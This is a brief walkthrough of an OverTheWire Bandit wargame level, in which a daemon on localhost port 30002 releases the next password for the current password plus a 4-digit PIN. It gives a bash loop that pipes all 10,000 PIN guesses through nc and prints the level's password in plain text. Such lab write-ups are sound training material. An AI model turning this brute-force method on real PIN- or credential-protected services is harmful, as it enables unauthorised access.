```bash
nc localhost 30002
```
- A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and secret numeric 4-digit pin.

- There is no way to retrieve the pin except by brute forcing.


```
<bandit24 password> <4 digit pin>
```


```bash
mkdir /tmp/bacon
```
- Create a script on `tmp` that will brute force the daemon

```bash
#!/bin/bash

for i in {0000..9999}; do
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
done | nc localhost 30002
```
- Script generates a range of four-digit numbers (from 0000 to 9999) and prefixes each number with a fixed string (`bandit24 password`)
- Each generated string is then piped into `nc` immediately. The `nc` sends this this string to `localhost 30002`
